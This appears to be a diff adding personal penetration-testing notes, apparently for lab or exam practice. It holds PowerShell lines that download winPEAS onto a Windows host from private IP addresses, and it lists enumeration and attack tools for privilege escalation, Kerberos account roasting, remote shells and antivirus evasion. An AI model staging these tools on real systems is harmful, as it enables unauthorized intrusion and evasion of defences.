@@ -1,0 +1,15 @@
+Download Files in Windows Server :
+  iwr -uri http://10.10.15.107:8080/winPEAS.exe -outfile winpeas.exe
+  Invoke-WebRequest http://10.10.15.72/winPEAS.exe -o c:/users/public/winpeas.exe
+  
+Enumeration Scripts:
+    emum4linux.pl
+    Winpeas (priv esc)
+    impacket/GetNPusers.py
+    
+    
+Usefull tools:
+    Evilwin-rm
+    shellter (AV evasion)
+    
+    
